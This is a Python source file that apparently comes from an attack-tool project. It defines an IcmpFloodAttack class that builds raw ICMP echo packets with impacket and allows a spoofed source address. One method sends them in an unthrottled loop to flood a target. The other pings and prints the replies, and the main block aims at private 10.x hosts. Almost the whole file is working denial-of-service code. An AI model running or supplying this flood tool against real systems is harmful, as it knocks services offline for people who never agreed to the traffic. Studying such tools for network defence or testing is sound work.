if __name__ == "__main__":
    import sys
    sys.path.append("../../")
import time
import socket
import select
from impacket import ImpactPacket, ImpactDecoder
from attack_means import random_api as ram
from attack_means import tools as tm
from multiprocessing import Queue


class IcmpFloodAttack:

    @staticmethod
    def send_icmp_packets(source: str, destination: str, packet_payload_size: int, stop_signal_queue: Queue):
        """
        产生 icmp 数据包
        :param source 源 ip 地址
        :param destination 目的 ip 地址
        :param packet_payload_size 数据包载荷部分的大小
        :param stop_signal_queue 停止发送的信号
        :return:
        """
        # 进行数据包的发送
        data = b"A" * packet_payload_size
        current_sent_packet = 1
        # 进行 raw socket 的创建
        raw_icmp_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_ICMP)
        # 创建 ip 包头
        ip = ImpactPacket.IP()
        ip.set_ip_src(source)
        ip.set_ip_dst(destination)
        # 创建 icmp 协议头
        icmp = ImpactPacket.ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        # 设置数据部分
        icmp.contains(ImpactPacket.Data(data))
        # 使用ip曾包含icmp曾
        ip.contains(icmp)
        while True:
            if not stop_signal_queue.empty():
                break
            try:
                # 发送到目的端
                raw_icmp_socket.sendto(ip.get_packet(), (destination, 0))
                # 暂停 1s
                # time.sleep(1)
                current_sent_packet += 1
            except Exception as e:
                print(e)
        return 0

    @staticmethod
    def send_icmp_packets_and_receive_reply(source, destination):
        """
        产生 icmp 数据包
        :return:
        """
        sequence_id = 1
        while True:
            # 创建 ip 包头
            ip = ImpactPacket.IP()
            ip.set_ip_src(source)
            ip.set_ip_dst(destination)
            # 创建 icmp 协议头
            icmp = ImpactPacket.ICMP()
            icmp.set_icmp_type(icmp.ICMP_ECHO)
            # 设置数据部分
            icmp.contains(ImpactPacket.Data(b"A" * ram.RandomApi.rand_int(16, 1024)))
            # 使用ip曾包含icmp曾
            ip.contains(icmp)
            # 创建 raw_socket
            raw_icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            # 设置选项 自定义 IP 头部
            raw_icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            # 设置序列号为1
            icmp.set_icmp_id(sequence_id)
            # 重新计算校验和
            icmp.set_icmp_cksum(0)
            icmp.auto_checksum = 1
            # 发送到目的端
            raw_icmp_socket.sendto(ip.get_packet(), (destination, 0))
            # 等待回来的消息
            # 第一个参数是读列表
            # 第二个参数是写列表
            # 第三个参数是执行列表
            # 第四个参数是超时时间
            if raw_icmp_socket in select.select([raw_icmp_socket], [], [], 1)[0]:
                reply = raw_icmp_socket.recvfrom(2000)[0]
                reply_ip = ImpactDecoder.IPDecoder().decode(reply)
                reply_icmp = reply_ip.child()
                if (reply_ip.get_ip_dst() == source) and (reply_ip.get_ip_src() == destination):
                    print(f"Ping reply for sequence {reply_icmp.get_icmp_id()}")
                    print(f"Reply info {reply_icmp.get_data_as_string()}")
            # time.sleep(1)
            sequence_id += 1


if __name__ == "__main__":
    IcmpFloodAttack.send_icmp_packets_and_receive_reply(source="10.134.149.124", destination="10.134.149.182")
